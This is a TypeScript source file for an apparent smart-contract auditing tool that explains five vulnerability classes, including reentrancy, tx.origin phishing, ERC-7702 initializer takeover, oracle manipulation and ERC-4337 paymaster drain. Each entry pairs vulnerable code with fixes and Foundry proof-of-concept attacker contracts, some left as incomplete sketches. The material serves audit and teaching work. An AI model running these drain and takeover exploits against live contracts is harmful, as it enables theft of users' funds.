/**
 * Explain Finding Tool
 *
 * Takes a vulnerability finding (by SWC ID, detector ID, or free-text title)
 * and returns a detailed explanation with:
 * - Root cause analysis
 * - Step-by-step exploit scenario
 * - Foundry PoC template
 * - Remediation code
 * - References
 */

import { z } from "zod";
import { Severity } from "../types/index.js";
import { logger } from "../utils/logger.js";

// ============================================================================
// Types
// ============================================================================

export const ExplainFindingInputSchema = z.object({
  findingId: z
    .string()
    .describe(
      "Finding ID to explain: SWC ID (e.g. 'SWC-107'), custom detector ID (e.g. 'CUSTOM-018'), " +
        "or free-text title (e.g. 'reentrancy', 'flash loan')"
    ),
  severity: z
    .enum(["critical", "high", "medium", "low", "informational"])
    .optional()
    .describe("Severity level for context (optional)"),
  contractContext: z
    .string()
    .optional()
    .describe("Brief description of the contract to tailor the explanation"),
});

export type ExplainFindingInput = z.infer<typeof ExplainFindingInputSchema>;

interface FindingExplanation {
  id: string;
  title: string;
  severity: Severity;
  rootCause: string;
  impactDescription: string;
  exploitScenario: string[];
  vulnerableCode: string;
  secureCode: string;
  pocTemplate: string;
  remediation: string[];
  references: string[];
}

// ============================================================================
// Finding Knowledge Base
// ============================================================================

const FINDING_DATABASE: Record<string, FindingExplanation> = {
  "SWC-107": {
    id: "SWC-107",
    title: "Reentrancy",
    severity: Severity.CRITICAL,
    rootCause:
      "The contract makes an external call to an untrusted address before updating its own state. " +
      "The called contract can re-enter the vulnerable function and exploit the stale state.",
    impactDescription:
      "An attacker can drain all ETH or tokens from the contract by recursively calling " +
      "the withdraw function before the balance is updated.",
    exploitScenario: [
      "1. Attacker deploys a malicious contract with a receive() or fallback() function",
      "2. Attacker calls victim.withdraw(1 ETH) from the malicious contract",
      "3. Victim sends 1 ETH to attacker (before updating balance)",
      "4. Attacker's receive() re-enters victim.withdraw(1 ETH)",
      "5. Balance is still non-zero (not yet updated), so withdrawal succeeds again",
      "6. Steps 4-5 repeat until the victim contract is drained",
    ],
    vulnerableCode: `// VULNERABLE: external call before state update
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    // ❌ External call BEFORE state update
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount; // Too late!
}`,
    secureCode: `// SECURE: Checks-Effects-Interactions + ReentrancyGuard
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // ✅ Update state BEFORE external call (CEI pattern)
    balances[msg.sender] -= amount;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableContract} from "src/VulnerableContract.sol";

contract ReentrancyAttacker {
    VulnerableContract public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 5 && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableContract public target;
    ReentrancyAttacker public attacker;

    function setUp() public {
        target = new VulnerableContract();
        attacker = new ReentrancyAttacker(address(target));
        // Seed victim with ETH from other users
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        target.deposit{value: 10 ether}();
    }

    function test_reentrancyDrain() public {
        vm.deal(address(attacker), 1 ether);
        uint256 balanceBefore = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        uint256 balanceAfter = address(attacker).balance;
        assertGt(balanceAfter, balanceBefore, "Attack should profit");
        emit log_named_uint("Profit (ETH)", (balanceAfter - balanceBefore) / 1e18);
    }
}`,
    remediation: [
      "Apply the Checks-Effects-Interactions (CEI) pattern: validate, update state, then call external",
      "Add OpenZeppelin's ReentrancyGuard modifier (nonReentrant) to all state-modifying functions",
      "Consider using a pull payment pattern instead of push (let users withdraw themselves)",
      "If using transient storage as a reentrancy guard, ensure it's not cleared by delegatecall",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-107",
      "https://docs.openzeppelin.com/contracts/api/security#ReentrancyGuard",
      "https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/",
    ],
  },

  "SWC-115": {
    id: "SWC-115",
    title: "Authorization Through tx.origin",
    severity: Severity.HIGH,
    rootCause:
      "tx.origin returns the original EOA that initiated the transaction chain, not the immediate caller. " +
      "When a victim interacts with an attacker's contract, the attacker's contract can call the victim " +
      "contract and tx.origin will be the victim's address — passing the authorization check.",
    impactDescription:
      "An attacker can trick a victim into calling a malicious contract, which then calls the vulnerable " +
      "contract on the victim's behalf, bypassing tx.origin-based authorization.",
    exploitScenario: [
      "1. Vulnerable contract uses require(tx.origin == owner) for authorization",
      "2. Attacker deploys a phishing contract that calls vulnerable.drain() in its receive()",
      "3. Attacker tricks the owner into sending ETH to the phishing contract",
      "4. tx.origin is the owner's address, authorization passes",
      "5. Phishing contract drains the vulnerable contract",
    ],
    vulnerableCode: `// VULNERABLE
function emergencyWithdraw() external {
    // ❌ tx.origin can be the victim of a phishing attack
    require(tx.origin == owner, "Not owner");
    payable(owner).transfer(address(this).balance);
}`,
    secureCode: `// SECURE
function emergencyWithdraw() external {
    // ✅ Use msg.sender for immediate caller verification
    require(msg.sender == owner, "Not owner");
    payable(owner).transfer(address(this).balance);
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableContract} from "src/VulnerableContract.sol";

contract PhishingContract {
    VulnerableContract public target;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    receive() external payable {
        // When owner sends ETH here, call drain on their behalf
        target.emergencyWithdraw();
    }
}

contract TxOriginTest is Test {
    VulnerableContract public target;
    PhishingContract public phishing;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        target = new VulnerableContract();
        phishing = new PhishingContract(address(target));
        vm.deal(address(target), 10 ether);
    }

    function test_txOriginExploit() public {
        uint256 phishingBalBefore = address(phishing).balance;
        // Owner is tricked into sending ETH to phishing contract
        vm.prank(owner); // tx.origin = owner
        (bool sent,) = address(phishing).call{value: 0.001 ether}("");
        assertTrue(sent);
        // Phishing contract has drained target
        assertEq(address(target).balance, 0);
    }
}`,
    remediation: [
      "Replace tx.origin with msg.sender for all authorization checks",
      "If you need to distinguish EOA from contract caller, use msg.sender and check extcodesize(msg.sender) == 0",
      "Never use tx.origin for access control in any context",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-115",
      "https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/",
    ],
  },

  "CUSTOM-018": {
    id: "CUSTOM-018",
    title: "ERC-7702 Unprotected Initializer After setCode",
    severity: Severity.CRITICAL,
    rootCause:
      "ERC-7702 allows EOAs to delegate their execution context to a smart contract via setCode. " +
      "If the delegated contract has an unguarded initialize() function, an attacker can call it " +
      "on a victim's EOA after delegation, taking ownership of the account.",
    impactDescription:
      "An attacker can gain full control over any EOA that has delegated to the vulnerable contract " +
      "by calling initialize() before the legitimate owner does, setting themselves as owner.",
    exploitScenario: [
      "1. Legitimate contract deployed with initialize() function guarded by initializer modifier",
      "2. Victim's EOA delegates to this contract via ERC-7702 setCode",
      "3. Attacker calls victim_eoa.initialize(attacker_address) in the same or next block",
      "4. If the initializer modifier is missing or bypassable, attacker becomes owner",
      "5. Attacker can now drain the EOA or use it for malicious purposes",
    ],
    vulnerableCode: `// VULNERABLE: initialize() without initializer guard
contract SmartWallet {
    address public owner;

    // ❌ No initializer guard — anyone can call this after ERC-7702 delegation
    function initialize(address _owner) external {
        owner = _owner;
    }
}`,
    secureCode: `// SECURE: Use OpenZeppelin Initializable
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract SmartWallet is Initializable {
    address public owner;

    // ✅ initializer modifier prevents re-initialization
    function initialize(address _owner) external initializer {
        owner = _owner;
    }

    // ✅ Disable initializers in implementation constructor
    constructor() {
        _disableInitializers();
    }

    // ✅ Also verify caller is the EOA itself for ERC-7702 contexts
    modifier onlySelf() {
        require(msg.sender == address(this), "Not self");
        _;
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SmartWallet} from "src/SmartWallet.sol";

contract ERC7702InitializerTest is Test {
    SmartWallet public impl;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        impl = new SmartWallet();
        // Simulate ERC-7702: victim EOA delegates to impl
        // In practice, this is done via a signed authorization tuple
        vm.etch(victim, address(impl).code);
    }

    function test_initializerTakeover() public {
        // Attacker calls initialize on victim's delegated account
        vm.prank(attacker);
        SmartWallet(victim).initialize(attacker);

        assertEq(SmartWallet(victim).owner(), attacker, "Attacker took ownership");
    }
}`,
    remediation: [
      "Use OpenZeppelin's Initializable with the initializer modifier on initialize()",
      "Call _disableInitializers() in the implementation constructor",
      "For ERC-7702, add require(msg.sender == address(this)) to restrict initialization to the delegating EOA",
      "Consider using reinitializer(version) for upgradeable contracts that need re-initialization",
    ],
    references: [
      "https://eips.ethereum.org/EIPS/eip-7702",
      "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing_the_implementation_contract",
    ],
  },

  "CUSTOM-004": {
    id: "CUSTOM-004",
    title: "Stale or Manipulable Price Oracle",
    severity: Severity.HIGH,
    rootCause:
      "The contract uses a spot price from a DEX reserve or an oracle without checking freshness. " +
      "An attacker can manipulate the spot price within a single transaction using a flash loan.",
    impactDescription:
      "An attacker can manipulate the price used for collateral valuation, borrowing limits, " +
      "or liquidation thresholds — allowing them to borrow more than allowed, avoid liquidation, " +
      "or trigger illegitimate liquidations.",
    exploitScenario: [
      "1. Attacker takes a flash loan of a large amount of tokenA",
      "2. Attacker swaps tokenA for tokenB in the DEX, manipulating the spot price",
      "3. Attacker calls the vulnerable contract which reads the manipulated spot price",
      "4. Using the inflated price, attacker borrows far more than their collateral is worth",
      "5. Attacker repays the flash loan and exits with the excess borrowed funds",
    ],
    vulnerableCode: `// VULNERABLE: spot price from DEX reserves
function getPrice() internal view returns (uint256) {
    // ❌ Spot price can be manipulated in a single block
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    return uint256(reserve1) * 1e18 / uint256(reserve0);
}

function borrow(uint256 amount) external {
    uint256 price = getPrice(); // manipulable!
    uint256 collateralValue = deposits[msg.sender] * price;
    require(collateralValue >= amount * 150 / 100, "Undercollateralized");
    borrowed[msg.sender] += amount;
    token.transfer(msg.sender, amount);
}`,
    secureCode: `// SECURE: Chainlink with staleness check + TWAP
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

AggregatorV3Interface public priceFeed;
uint256 public constant STALENESS_THRESHOLD = 3600; // 1 hour

function getPrice() internal view returns (uint256) {
    (
        uint80 roundId,
        int256 price,
        ,
        uint256 updatedAt,
        uint80 answeredInRound
    ) = priceFeed.latestRoundData();
    // ✅ Staleness check
    require(updatedAt >= block.timestamp - STALENESS_THRESHOLD, "Stale price");
    // ✅ Round completion check
    require(answeredInRound >= roundId, "Incomplete round");
    require(price > 0, "Invalid price");
    return uint256(price);
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {LendingPool} from "src/LendingPool.sol";

contract OracleManipulationTest is Test {
    LendingPool public lending;
    IUniswapV2Pair public pair;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function test_flashLoanOracleManipulation() public {
        uint256 flashAmount = 1_000_000e18;
        uint256 borrowerCollateral = 100e18;

        // Attacker deposits collateral
        vm.startPrank(attacker);
        tokenB.approve(address(lending), borrowerCollateral);
        lending.deposit(borrowerCollateral);

        // At fair price, max borrow = 66 tokenA (150% collateral ratio)
        uint256 fairMaxBorrow = lending.maxBorrow(attacker);

        // Flash loan to manipulate price
        // ... (flash loan callback manipulates pair reserves)

        // After manipulation, borrow 10x more than allowed
        uint256 manipulatedMaxBorrow = lending.maxBorrow(attacker);
        assertGt(manipulatedMaxBorrow, fairMaxBorrow * 5, "Price manipulation successful");
        vm.stopPrank();
    }
}`,
    remediation: [
      "Use Chainlink price feeds with staleness checks (updatedAt >= block.timestamp - MAX_STALENESS)",
      "Validate round data: answeredInRound >= roundId and price > 0",
      "Use TWAP (time-weighted average price) instead of spot prices for DEX-based oracles",
      "For Uniswap V3, use OracleLibrary.consult() with a meaningful period (e.g., 30 minutes)",
      "Consider multi-oracle redundancy: require prices from 2+ sources to agree within a threshold",
    ],
    references: [
      "https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles",
      "https://samczsun.com/so-you-want-to-use-a-price-oracle/",
      "https://docs.chain.link/data-feeds/price-feeds",
    ],
  },

  "CUSTOM-032": {
    id: "CUSTOM-032",
    title: "ERC-4337 Paymaster Drain",
    severity: Severity.CRITICAL,
    rootCause:
      "ERC-4337 Paymasters sponsor gas for UserOperations. If validatePaymasterUserOp does not " +
      "strictly validate the sender and operation, attackers can craft UserOperations that " +
      "get sponsored by the paymaster without meeting the intended criteria.",
    impactDescription:
      "An attacker can drain the paymaster's deposit in the EntryPoint by submitting " +
      "sponsored UserOperations that consume gas without legitimate use.",
    exploitScenario: [
      "1. Paymaster is deployed to sponsor gas for users of dApp X",
      "2. Paymaster's validatePaymasterUserOp doesn't check callData target",
      "3. Attacker creates UserOperation calling any expensive contract (not dApp X)",
      "4. Paymaster sponsores the gas (validation passes)",
      "5. Attacker repeats until paymaster deposit is drained",
    ],
    vulnerableCode: `// VULNERABLE: no sender validation in paymaster
function validatePaymasterUserOp(
    UserOperation calldata userOp,
    bytes32 userOpHash,
    uint256 maxCost
) external override returns (bytes memory context, uint256 validationData) {
    // ❌ No validation of sender, callData target, or gas budget
    return (abi.encode(userOp.sender), 0); // Always approves
}`,
    secureCode: `// SECURE: full validation
mapping(address => uint256) public gasUsed;
uint256 public constant MAX_GAS_PER_USER = 1_000_000;
address public allowedTarget;

function validatePaymasterUserOp(
    UserOperation calldata userOp,
    bytes32 userOpHash,
    uint256 maxCost
) external override returns (bytes memory context, uint256 validationData) {
    // ✅ Check sender whitelist or criteria
    require(isEligible(userOp.sender), "Not eligible for sponsorship");

    // ✅ Check callData target
    address target = address(bytes20(userOp.callData[16:36]));
    require(target == allowedTarget, "Target not sponsored");

    // ✅ Enforce per-user gas budget
    require(gasUsed[userOp.sender] + maxCost <= MAX_GAS_PER_USER, "Gas budget exceeded");

    return (abi.encode(userOp.sender, maxCost), 0);
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerablePaymaster} from "src/VulnerablePaymaster.sol";
import {EntryPoint} from "@account-abstraction/contracts/core/EntryPoint.sol";

contract PaymasterDrainTest is Test {
    EntryPoint public entryPoint;
    VulnerablePaymaster public paymaster;
    address attacker = makeAddr("attacker");

    function setUp() public {
        entryPoint = new EntryPoint();
        paymaster = new VulnerablePaymaster(entryPoint);
        // Fund paymaster
        entryPoint.depositTo{value: 10 ether}(address(paymaster));
    }

    function test_paymasterDrain() public {
        uint256 depositBefore = entryPoint.balanceOf(address(paymaster));

        // Attacker submits gas-heavy UserOperation targeting arbitrary contract
        UserOperation memory op = buildMaliciousOp(attacker, address(paymaster));
        entryPoint.handleOps(toArray(op), payable(attacker));

        uint256 depositAfter = entryPoint.balanceOf(address(paymaster));
        assertLt(depositAfter, depositBefore, "Paymaster was drained");
    }
}`,
    remediation: [
      "Always validate userOp.sender against a whitelist or eligibility criteria",
      "Validate the callData target to ensure it points to the intended contract",
      "Implement per-user gas quotas and track usage in a mapping",
      "Consider time-based quota resets (daily/weekly gas allowance)",
      "Use postOp to track and refund or penalize based on actual gas used",
    ],
    references: [
      "https://eips.ethereum.org/EIPS/eip-4337",
      "https://docs.stackup.sh/docs/paymaster-overview",
      "https://github.com/eth-infinitism/account-abstraction/tree/develop/contracts/samples",
    ],
  },
};

// ============================================================================
// Fuzzy matching for free-text queries
// ============================================================================

function findExplanation(query: string): FindingExplanation | undefined {
  const q = query.toLowerCase().trim();

  // Direct ID match
  const directMatch =
    FINDING_DATABASE[query.toUpperCase()] ??
    FINDING_DATABASE[query.toUpperCase().replace(/[^A-Z0-9-]/g, "")];
  if (directMatch) return directMatch;

  // Keyword matching
  const keywordMap: Record<string, string> = {
    reentrancy: "SWC-107",
    "re-entrancy": "SWC-107",
    "cross-function": "SWC-107",
    "tx.origin": "SWC-115",
    "tx origin": "SWC-115",
    phishing: "SWC-115",
    oracle: "CUSTOM-004",
    "flash loan": "CUSTOM-004",
    "price manipulation": "CUSTOM-004",
    "spot price": "CUSTOM-004",
    "erc-7702": "CUSTOM-018",
    erc7702: "CUSTOM-018",
    "set code": "CUSTOM-018",
    initialize: "CUSTOM-018",
    paymaster: "CUSTOM-032",
    "erc-4337": "CUSTOM-032",
    "account abstraction": "CUSTOM-032",
    "4337": "CUSTOM-032",
  };

  for (const [keyword, id] of Object.entries(keywordMap)) {
    if (q.includes(keyword)) {
      return FINDING_DATABASE[id];
    }
  }

  return undefined;
}

// ============================================================================
// Main Function
// ============================================================================

export async function explainFinding(input: ExplainFindingInput): Promise<string> {
  logger.info(`[explainFinding] Explaining: ${input.findingId}`);

  const explanation = findExplanation(input.findingId);

  if (!explanation) {
    return formatNotFound(input.findingId);
  }

  return formatExplanation(explanation, input.contractContext);
}

// ============================================================================
// Output Formatting
// ============================================================================

function formatNotFound(query: string): string {
  const available = Object.keys(FINDING_DATABASE).join(", ");
  return [
    "═══════════════════════════════════════════════════════════════════════════════",
    `  FINDING NOT FOUND: "${query}"`,
    "═══════════════════════════════════════════════════════════════════════════════",
    "",
    `  No explanation found for "${query}".`,
    "",
    "  Available finding IDs:",
    `  ${available}`,
    "",
    "  You can also search by keyword:",
    "  reentrancy, tx.origin, flash loan, oracle, price manipulation,",
    "  erc-7702, paymaster, erc-4337, account abstraction",
    "",
    "  Example: explain_finding({ findingId: 'reentrancy' })",
    "═══════════════════════════════════════════════════════════════════════════════",
  ].join("\n");
}

function formatExplanation(exp: FindingExplanation, context?: string): string {
  const severityEmoji: Record<string, string> = {
    critical: "🔴",
    high: "🟠",
    medium: "🟡",
    low: "🔵",
    informational: "⚪",
  };
  const emoji = severityEmoji[exp.severity] ?? "⚪";

  const lines: string[] = [];

  lines.push("═══════════════════════════════════════════════════════════════════════════════");
  lines.push(`  ${emoji} [${exp.id}] ${exp.title}`);
  lines.push(`  Severity: ${exp.severity.toUpperCase()}`);
  if (context) {
    lines.push(`  Context: ${context}`);
  }
  lines.push("═══════════════════════════════════════════════════════════════════════════════");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  ROOT CAUSE                                                                 │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push(`  ${exp.rootCause}`);
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  IMPACT                                                                     │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push(`  ${exp.impactDescription}`);
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  EXPLOIT SCENARIO                                                           │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  for (const step of exp.exploitScenario) {
    lines.push(`  ${step}`);
  }
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  VULNERABLE CODE                                                            │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push("  ```solidity");
  for (const codeLine of exp.vulnerableCode.split("\n")) {
    lines.push(`  ${codeLine}`);
  }
  lines.push("  ```");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  SECURE CODE                                                                │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push("  ```solidity");
  for (const codeLine of exp.secureCode.split("\n")) {
    lines.push(`  ${codeLine}`);
  }
  lines.push("  ```");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  FOUNDRY PROOF OF CONCEPT                                                   │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  lines.push("  ```solidity");
  for (const codeLine of exp.pocTemplate.split("\n")) {
    lines.push(`  ${codeLine}`);
  }
  lines.push("  ```");
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  REMEDIATION                                                                │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  for (const step of exp.remediation) {
    lines.push(`  • ${step}`);
  }
  lines.push("");

  lines.push("┌─────────────────────────────────────────────────────────────────────────────┐");
  lines.push("│  REFERENCES                                                                 │");
  lines.push("└─────────────────────────────────────────────────────────────────────────────┘");
  for (const ref of exp.references) {
    lines.push(`  - ${ref}`);
  }
  lines.push("");

  lines.push("═══════════════════════════════════════════════════════════════════════════════");

  return lines.join("\n");
}
